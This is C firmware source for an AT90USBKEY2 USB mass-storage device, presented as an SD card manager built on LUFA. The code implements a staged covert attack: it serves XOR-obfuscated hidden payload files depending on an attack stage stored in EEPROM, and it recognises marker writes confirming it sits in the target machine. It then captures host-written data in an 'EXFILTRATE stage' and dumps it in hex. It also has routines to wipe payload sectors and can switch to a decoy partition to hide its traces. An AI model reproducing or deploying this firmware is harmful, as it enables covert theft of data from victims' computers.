/*
David Reguera Garcia aka Dreg - dreg@fr33project.org - https://github.com/David-Reguera-Garcia-Dreg - http://www.fr33project.org

ported from LUFA_091223 http://www.fourwalledcubicle.com/LUFA.php
to lufa-LUFA-170418

ported from Mathieu Sonet lufa-sdcard-mass-storage-demo USB Mass storage on SD card with a Teensy2/ATMEGA32U4 https://bitbucket.org/elasticsheep/lufa-sdcard-mass-storage-demo/src/default/
to AT90USBKEY2 at90usb1287

ported from http://www.roland-riegel.de/sd-reader/index.html MMC/SD/SDHC card reader library 
to FatFS - Generic FAT Filesystem Module - http://elm-chan.org/fsw/ff/00index_e.html
*/

/*
             LUFA Library
     Copyright (C) Dean Camera, 2009.
              
  dean [at] fourwalledcubicle [dot] com
      www.fourwalledcubicle.com
*/

/*
  Copyright 2009  Dean Camera (dean [at] fourwalledcubicle [dot] com)

  Permission to use, copy, modify, and distribute this software
  and its documentation for any purpose and without fee is hereby
  granted, provided that the above copyright notice appear in all
  copies and that both that the copyright notice and this
  permission notice and warranty disclaimer appear in supporting
  documentation, and that the name of the author not be used in
  advertising or publicity pertaining to distribution of the
  software without specific, written prior permission.

  The author disclaim all warranties with regard to this
  software, including all implied warranties of merchantability
  and fitness.  In no event shall the author be liable for any
  special, indirect or consequential damages or any damages
  whatsoever resulting from loss of use, data or profits, whether
  in an action of contract, negligence or other tortious action,
  arising out of or in connection with the use or performance of
  this software.
*/

/** \file
 *
 *  Functions to manage the physical dataflash media, including reading and writing of
 *  blocks of data. These functions are called by the SCSI layer when data must be stored
 *  or retrieved to/from the physical storage media. If a different media is used (such
 *  as a SD card or EEPROM), functions similar to these will need to be generated.
 */



#define NO_DEL_SECTS 1



#define  INCLUDE_FROM_SDCARDMANAGER_C
#include "SDCardManager.h"
#include "mmc_avr.h"
#include "diskio.h"

#include <avr/eeprom.h>

#define EXF_AREA_START_LBA 0x77F005
#define EXF_AREA_END_LBA 0x1CE0000 // 16 GB SD

#define FIRST_FILE_LBA 0x77b000
#define SECOND_FILE_LBA 0x77d000
#define G_FILE_LBA 0x21c0

#define END_FILES_LBA (SECOND_FILE_LBA + (SECOND_FILE_LBA - FIRST_FILE_LBA))

uint32_t curr_disk_serial;


EPPR_VARS_t eppr_vars;

/*
end copy 1 at offset: 0x77b00000 - sector: 0x3bd800
end copy 2 at offset: 0xef600000 - sector: 0x77b000
*/
#define DISTANCE_TO_ONLYMASS 0x3bd800

#define START_F_SECT 0x1c0 
#define END_F_SECT 0x21bf

#define ROOT_DIR_LBA 0x140

uint8_t please_reboot = 0;

static uint32_t CachedTotalBlocks = 0;

#ifndef NO_DEL_SECTS
static uint8_t zero_block[512];
#endif 

unsigned int mapped_root_dir = 0;

void SetMappedRootDir(void)
{
	if (mapped_root_dir == 0)
	{
		printf_P(PSTR("\r\nfirst mapped root dir!\r\n"));
		PrintEPPRVARS();
		printf_P(PSTR("\r\ncurr_disk_serial: %li\r\n"), curr_disk_serial);
	}

	mapped_root_dir = 1;
}

void InitEPPRVARS(void)
{
	//puts_P(PSTR("init vars EEPROM....\r\n"));
		
	eppr_vars.curr_stage = ATTSTAG_1;
	eppr_vars.last_lba_deleted_f = FIRST_FILE_LBA;
	eppr_vars.last_lba_deleted_s = SECOND_FILE_LBA;
	eppr_vars.first_deleted_f = 0;
	eppr_vars.first_deleted_s = 0;
	eppr_vars.onlymassflag = 0;
	eppr_vars.last_exf_blck_wr = EXF_AREA_START_LBA;
	eppr_vars.last_disk_serial = 0x69696969;
}


void PrintEPPRVARS(void)
{
	printf_P(PSTR("\r\n"
	"eppr_vars.curr_stage: 0x%lx\r\n"
	"eppr_vars.last_lba_deleted_f: 0x%lx\r\n"
	"eppr_vars.last_lba_deleted_s: 0x%lx\r\n"
	"eppr_vars.first_deleted_f: 0x%lx\r\n"
	"eppr_vars.first_deleted_s: 0x%lx\r\n"
	"eppr_vars.onlymassflag: 0x%lx\r\n"
	"eppr_vars.last_exf_blck_wr: 0x%lx\r\n"),
	(uint32_t) eppr_vars.curr_stage,
	(uint32_t) eppr_vars.last_lba_deleted_f,
	(uint32_t) eppr_vars.last_lba_deleted_s,
	(uint32_t) eppr_vars.first_deleted_f,
	(uint32_t) eppr_vars.first_deleted_s,
	(uint32_t) eppr_vars.onlymassflag,
	(uint32_t) eppr_vars.last_exf_blck_wr);
}


void SaveEPPRVARS(void)
{
	//puts_P(PSTR("\r\nsaving EEPROM....\r\n"));
	eppr_vars.last_disk_serial++;
	eeprom_write_block(&eppr_vars, (void*)69, sizeof(eppr_vars));
}

void LoadEPPRVARS(void)
{
	//puts_P(PSTR("\r\nloading EEPROM...\r\n"));
	memset(&eppr_vars, 0, sizeof(eppr_vars));
	eeprom_read_block(&eppr_vars, (void*)69, sizeof(eppr_vars));
}

void SDCardManager_DeleteFilesF(void)
{
	//static uint32_t last_lba_deleted = FIRST_FILE_LBA;
	static uint32_t cnt = 0xFFFFF;
	//static uint8_t first_deleted = 0;
	static uint8_t cnteppr = 0xFF;
	
	if (eppr_vars.first_deleted_f == 3)
	{
		return;
	}
	
	if (eppr_vars.curr_stage >= ATTSTAG_3)
	{
		if (mapped_root_dir && cnt == 0)
		{
			if (eppr_vars.first_deleted_f == 0)
			{
				eppr_vars.first_deleted_f = 1;
				//printf_P(PSTR("\r\ndeleting sectors STAGE FIRST from: 0x%lx to: 0x%lx\r\n"), eppr_vars.last_lba_deleted_f, SECOND_FILE_LBA);
			}
			if (eppr_vars.last_lba_deleted_f <= SECOND_FILE_LBA)
			{
				//printf_P(PSTR("\r\ndeleting block: 0x%lx\r\n"), last_lba_deleted);
				#ifndef NO_DEL_SECTS
				disk_write(0, zero_block, eppr_vars.last_lba_deleted_f, 1);
				#endif 
				eppr_vars.last_lba_deleted_f++;
				cnteppr--;
				if (cnteppr == 0)
				{
					#ifndef NO_DEL_SECTS
					SaveEPPRVARS();
					#endif
					cnteppr = 0xFF;
				}
			}
			else
			{
				//printf_P(PSTR("\r\nALL SECTORS STAGE FIRST DELETED!\r\n"));
				eppr_vars.first_deleted_f = 3;
				#ifndef NO_DEL_SECTS
				SaveEPPRVARS();
				#endif
			}
		}
		
		if (cnt != 0)
		{
			cnt--;
		}
	}
}


void SDCardManager_DeleteFilesS(void)
{
	//static uint32_t last_lba_deleted = SECOND_FILE_LBA;
	static uint32_t cnt = 0xFFFFF;
	//static uint8_t first_deleted = 0;
	
	if (eppr_vars.first_deleted_s == 3)
	{
		return;
	}
	
	if (eppr_vars.curr_stage >= ATTSTAG_3)
	{
		if (mapped_root_dir && cnt == 0)
		{
			if (eppr_vars.first_deleted_s == 0)
			{
				eppr_vars.first_deleted_s = 1;
				//printf_P(PSTR("\r\ndeleting sectors STAGE SECOND from: 0x%lx to: 0x%lx\r\n"), eppr_vars.last_lba_deleted_s, END_FILES_LBA);
			}
			if (eppr_vars.last_lba_deleted_s <= END_FILES_LBA)
			{
				//printf_P(PSTR("\r\ndeleting block: 0x%lx\r\n"), last_lba_deleted);
				#ifndef NO_DEL_SECTS
				disk_write(0, zero_block, eppr_vars.last_lba_deleted_s, 1);
				#endif 
				eppr_vars.last_lba_deleted_s++;
			}
			else
			{
				//printf_P(PSTR("\r\nALL SECTORS DELETED STAGE SECOND!\r\n"));
				eppr_vars.first_deleted_s = 3;
				#ifndef NO_DEL_SECTS
				SaveEPPRVARS();
				#endif
			}
		}
		
		if (cnt != 0)
		{
			cnt--;
		}
	}	
}

void SDCardManager_DeleteFiles(void)
{
	static unsigned int cnt;
	
	if (cnt++ % 2 == 0)
	{
		SDCardManager_DeleteFilesS();
	}
	else
	{
		SDCardManager_DeleteFilesF();
	}
}
	
void SDCardManager_Init(void)
{
	do
	{
		printf_P(PSTR("\r\ntrying ... disk_initialize\r\n"));
	} while(disk_initialize(0) != FR_OK);

	printf_P(PSTR("\r\ndisk_initialize success\r\n"));
	if (curr_disk_serial == 0)
	{
		eppr_vars.last_disk_serial++;
		SaveEPPRVARS();
		curr_disk_serial = eppr_vars.last_disk_serial;
	}
}

uint32_t SDCardManager_GetNbBlocks(void)
{
	DWORD ioct_rsp = 0;
	
	if (CachedTotalBlocks != 0)
		return CachedTotalBlocks;
		
	disk_ioctl(0, GET_SECTOR_COUNT, &ioct_rsp);

	CachedTotalBlocks = ioct_rsp;
	CachedTotalBlocks = 3921920; // 2 GB
	//printf_P(PSTR("\r\nSD blocks: %li\r\n"), CachedTotalBlocks);
	
	return CachedTotalBlocks;
}

/** Writes blocks (OS blocks, not Dataflash pages) to the storage medium, the board dataflash IC(s), from
 *  the pre-selected data OUT endpoint. This routine reads in OS sized blocks from the endpoint and writes
 *  them to the dataflash in Dataflash page sized blocks.
 *
 *  \param[in] BlockAddress  Data block starting address for the write sequence
 *  \param[in] TotalBlocks   Number of blocks of data to write
 */
uintptr_t SDCardManager_WriteBlockHandler(uint8_t* buff_to_write, void* a, void* p)
{
	/* Check if the endpoint is currently empty */
	if (!(Endpoint_IsReadWriteAllowed()))
	{
		/* Clear the current endpoint bank */
		Endpoint_ClearOUT();
		
		/* Wait until the host has sent another packet */
		if (Endpoint_WaitUntilReady())
		  return 0;
	}
	
	/* Write one 16-byte chunk of data to the dataflash */
	buff_to_write[0] = Endpoint_Read_8();
	buff_to_write[1] = Endpoint_Read_8();
	buff_to_write[2] = Endpoint_Read_8();
	buff_to_write[3] = Endpoint_Read_8();
	buff_to_write[4] = Endpoint_Read_8();
	buff_to_write[5] = Endpoint_Read_8();
	buff_to_write[6] = Endpoint_Read_8();
	buff_to_write[7] = Endpoint_Read_8();
	buff_to_write[8] = Endpoint_Read_8();
	buff_to_write[9] = Endpoint_Read_8();
	buff_to_write[10] = Endpoint_Read_8();
	buff_to_write[11] = Endpoint_Read_8();
	buff_to_write[12] = Endpoint_Read_8();
	buff_to_write[13] = Endpoint_Read_8();
	buff_to_write[14] = Endpoint_Read_8();
	buff_to_write[15] = Endpoint_Read_8();
	
	return 16;
}

void SendRbtMsg(void)
{
	printf("\r\nplease reboot me....\r\n+DrG0\r\n");	
}

void CheckIfReboot(void)
{
	/*
	if (please_reboot == 1)
	{
		SendRbtMsg();
	} 
	*/
}

void SDCardManager_WriteBlocksNormal(USB_ClassInfo_MS_Device_t* MSInterfaceInfo, uint32_t BlockAddress, uint16_t TotalBlocks)
{
	int i;
	static uint8_t buff_to_write[512];
	
	//printf_P(PSTR("W %li %i\r\n"), BlockAddress, TotalBlocks);

	/* Wait until endpoint is ready before continuing */
	if (Endpoint_WaitUntilReady())
	  return;
	
	while (TotalBlocks)
	{
		for (i = 0; i < 32; i++)
		{
			SDCardManager_WriteBlockHandler(buff_to_write + (16 * i), NULL, NULL);	
		}
		
		if (BlockAddress == G_FILE_LBA)
		{
			if (eppr_vars.curr_stage == ATTSTAG_1)
			{
				if (buff_to_write[0] == 'D' && 
					buff_to_write[1] == 'R' &&
					buff_to_write[2] == 'G' &&
					buff_to_write[3] == 'W' &&
					buff_to_write[4] == 'I' &&
					buff_to_write[5] == 'N')
					{
						printf_P(PSTR("\r\nI am in target machine!! next stage...\r\n"));
						eppr_vars.curr_stage = ATTSTAG_2;
						SaveEPPRVARS();
						please_reboot = 1;
						SendRbtMsg();
					}
			}
			else if (eppr_vars.curr_stage == ATTSTAG_2)
			{
				if (buff_to_write[0] == 'E' && 
					buff_to_write[1] == 'X' &&
					buff_to_write[2] == 'F' &&
					buff_to_write[3] == 'S' &&
					buff_to_write[4] == 'T' &&
					buff_to_write[5] == 'G')
					{
						printf_P(PSTR("\r\nEXFILTRATE stage...\r\n"));
						eppr_vars.curr_stage = ATTSTAG_3;
						SaveEPPRVARS();
						please_reboot = 1;
						SendRbtMsg();
					}
			}
			else if (eppr_vars.curr_stage == ATTSTAG_3)
			{
				if (buff_to_write[0] == 'E' && 
					buff_to_write[1] == 'N' &&
					buff_to_write[2] == 'D' &&
					buff_to_write[3] == 'T' &&
					buff_to_write[4] == 'T' &&
					buff_to_write[5] == 'K')
					{
						//printf_P(PSTR("\r\nonlymass stage...\r\n"));
						eppr_vars.curr_stage = ATTSTAG_4;
						eppr_vars.onlymassflag = 1;
						SaveEPPRVARS();
						please_reboot = 1;
						SendRbtMsg();
					}
				else if (buff_to_write[0] == '0' && 
					buff_to_write[1] == 'x')
					{
						printf_P(PSTR("\r\n(0x%lx)EXBLK: +DrG1"), eppr_vars.last_exf_blck_wr);
						for (i = 0; i < 126; i++)
						{
							_delay_ms(1);
							printf("%02x", buff_to_write[i]);
						}
						printf_P(PSTR("\r\n"));
						
						disk_write(0, buff_to_write, BlockAddress, 1);
						
						BlockAddress = eppr_vars.last_exf_blck_wr++;
						SaveEPPRVARS();
					}
					
				
			}
			disk_write(0, buff_to_write, BlockAddress, 1);
		}

		//disk_write(0, buff_to_write, BlockAddress, 1);
				
		/* Check if the current command is being aborted by the host */
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return;
			
		/* Decrement the blocks remaining counter and reset the sub block counter */
		BlockAddress++;
		TotalBlocks--;
	}

	/* If the endpoint is empty, clear it ready for the next packet from the host */
	if (!(Endpoint_IsReadWriteAllowed()))
	  Endpoint_ClearOUT();
}

void SDCardManager_WriteBlocksOnlyMass(USB_ClassInfo_MS_Device_t* MSInterfaceInfo, uint32_t BlockAddress, uint16_t TotalBlocks)
{
	int i;
	static uint8_t buff_to_write[512];
	
	BlockAddress += DISTANCE_TO_ONLYMASS;
	
	printf_P(PSTR("W %li %i\r\n"), BlockAddress, TotalBlocks);

	/* Wait until endpoint is ready before continuing */
	if (Endpoint_WaitUntilReady())
	  return;
	
	while (TotalBlocks)
	{
		for (i = 0; i < 32; i++)
		{
			SDCardManager_WriteBlockHandler(buff_to_write + (16 * i), NULL, NULL);	
		}
		
		disk_write(0, buff_to_write, BlockAddress, 1);
				
		/* Check if the current command is being aborted by the host */
		if (MSInterfaceInfo->State.IsMassStoreReset)
		  return;
			
		/* Decrement the blocks remaining counter and reset the sub block counter */
		BlockAddress++;
		TotalBlocks--;
	}

	/* If the endpoint is empty, clear it ready for the next packet from the host */
	if (!(Endpoint_IsReadWriteAllowed()))
	  Endpoint_ClearOUT();
}

void SDCardManager_WriteBlocks(USB_ClassInfo_MS_Device_t* MSInterfaceInfo, uint32_t BlockAddress, uint16_t TotalBlocks)
{
	if (eppr_vars.onlymassflag)
	{
		SDCardManager_WriteBlocksOnlyMass(MSInterfaceInfo, BlockAddress, TotalBlocks);
	}
	else
	{
		SDCardManager_WriteBlocksNormal(MSInterfaceInfo, BlockAddress, TotalBlocks);
	}
}

/** Reads blocks (OS blocks, not Dataflash pages) from the storage medium, the board dataflash IC(s), into
 *  the pre-selected data IN endpoint. This routine reads in Dataflash page sized blocks from the Dataflash
 *  and writes them in OS sized blocks to the endpoint.
 *
 *  \param[in] BlockAddress  Data block starting address for the read sequence
 *  \param[in] TotalBlocks   Number of blocks of data to read
 */

static inline uint8_t SDCardManager_ReadBlockHandler(uint8_t* buffer, void* a, void* p)
{
	/* Check if the endpoint is currently full */
	if (!(Endpoint_IsReadWriteAllowed()))
	{
		/* Clear the endpoint bank to send its contents to the host */
		Endpoint_ClearIN();
		
		/* Wait until the endpoint is ready for more data */
		if (Endpoint_WaitUntilReady())
		  return 0;
	}
		
	Endpoint_Write_8(buffer[0]);
	Endpoint_Write_8(buffer[1]);
	Endpoint_Write_8(buffer[2]);
	Endpoint_Write_8(buffer[3]);
	Endpoint_Write_8(buffer[4]);
	Endpoint_Write_8(buffer[5]);
	Endpoint_Write_8(buffer[6]);
	Endpoint_Write_8(buffer[7]);
	Endpoint_Write_8(buffer[8]);
	Endpoint_Write_8(buffer[9]);
	Endpoint_Write_8(buffer[10]);
	Endpoint_Write_8(buffer[11]);
	Endpoint_Write_8(buffer[12]);
	Endpoint_Write_8(buffer[13]);
	Endpoint_Write_8(buffer[14]);
	Endpoint_Write_8(buffer[15]);
	
	return 1;
}

void SDCardManager_ReadBlocksNormal(USB_ClassInfo_MS_Device_t* MSInterfaceInfo, uint32_t BlockAddress, uint16_t TotalBlocks)
{
	static uint8_t buff_rd[512];
	int i;
	uint32_t redirected_lba;
	
	//printf_P(PSTR("R %li %i\r\n"), BlockAddress, TotalBlocks);
	
	/* Wait until endpoint is ready before continuing */
	if (Endpoint_WaitUntilReady())
	  return;
	
	while (TotalBlocks)
	{
		if (BlockAddress >= START_F_SECT && BlockAddress <= END_F_SECT)
		{
			if (eppr_vars.curr_stage == ATTSTAG_1)
			{
				redirected_lba = FIRST_FILE_LBA + (BlockAddress - START_F_SECT);
			}
			else if (eppr_vars.curr_stage == ATTSTAG_2)
			{
				redirected_lba = SECOND_FILE_LBA + (BlockAddress - START_F_SECT);
			}
			else
			{
				redirected_lba = BlockAddress;
			}
			//printf_P(PSTR("\r\nredirected lba f_sect %li\r\n"), redirected_lba);
			disk_read(0, buff_rd, redirected_lba, 1); 
			// decrypting...
			for (i = 0; i < 512; i++)
			{
				buff_rd[i] ^= 0xAA;
			}
		}
		else
		{
			if (BlockAddress == ROOT_DIR_LBA)
			{
				SetMappedRootDir();
			}
			
			disk_read(0, buff_rd, BlockAddress, 1);
			
			if (BlockAddress == G_FILE_LBA)
			{
				buff_rd[0] = eppr_vars.curr_stage;
				buff_rd[1] = eppr_vars.curr_stage;	
			}
			else if (BlockAddress == 0)
			{
				memcpy(buff_rd + 0x27, &curr_disk_serial, sizeof(curr_disk_serial));
			}
		}
		
		for (i = 0; i < 32; i++)
		{
			SDCardManager_ReadBlockHandler(buff_rd + (16 * i), NULL, NULL);	
		}
		/* Decrement the blocks remaining counter */
		BlockAddress++;
		TotalBlocks--;
	}
	
	/* If the endpoint is full, send its contents to the host */
	if (!(Endpoint_IsReadWriteAllowed()))
	  Endpoint_ClearIN();
}

void SDCardManager_ReadBlocksOnlyMass(USB_ClassInfo_MS_Device_t* MSInterfaceInfo, uint32_t BlockAddress, uint16_t TotalBlocks)
{
	static uint8_t buff_rd[512];
	int i;
	uint32_t original_lba = BlockAddress;
	
	BlockAddress += DISTANCE_TO_ONLYMASS;
	
	printf_P(PSTR("R %li %li %i\r\n"), BlockAddress - DISTANCE_TO_ONLYMASS, BlockAddress, TotalBlocks);
	
	/* Wait until endpoint is ready before continuing */
	if (Endpoint_WaitUntilReady())
	  return;
	
	while (TotalBlocks)
	{
		if (original_lba == ROOT_DIR_LBA)
		{
			SetMappedRootDir();
		}
			
		disk_read(0, buff_rd, BlockAddress, 1);
		for (i = 0; i < 32; i++)
		{
			SDCardManager_ReadBlockHandler(buff_rd + (16 * i), NULL, NULL);	
		}
		/* Decrement the blocks remaining counter */
		BlockAddress++;
		TotalBlocks--;
	}
	
	/* If the endpoint is full, send its contents to the host */
	if (!(Endpoint_IsReadWriteAllowed()))
	  Endpoint_ClearIN();
}

void SDCardManager_ReadBlocks(USB_ClassInfo_MS_Device_t* MSInterfaceInfo, uint32_t BlockAddress, uint16_t TotalBlocks)
{
	if (eppr_vars.onlymassflag)
	{
		SDCardManager_ReadBlocksOnlyMass(MSInterfaceInfo, BlockAddress, TotalBlocks);
	}
	else
	{
		SDCardManager_ReadBlocksNormal(MSInterfaceInfo, BlockAddress, TotalBlocks);
	}
}

/** Performs a simple test on the attached Dataflash IC(s) to ensure that they are working.
 *
 *  \return Boolean true if all media chips are working, false otherwise
 */
bool SDCardManager_CheckDataflashOperation(void)
{	
	return true;
}
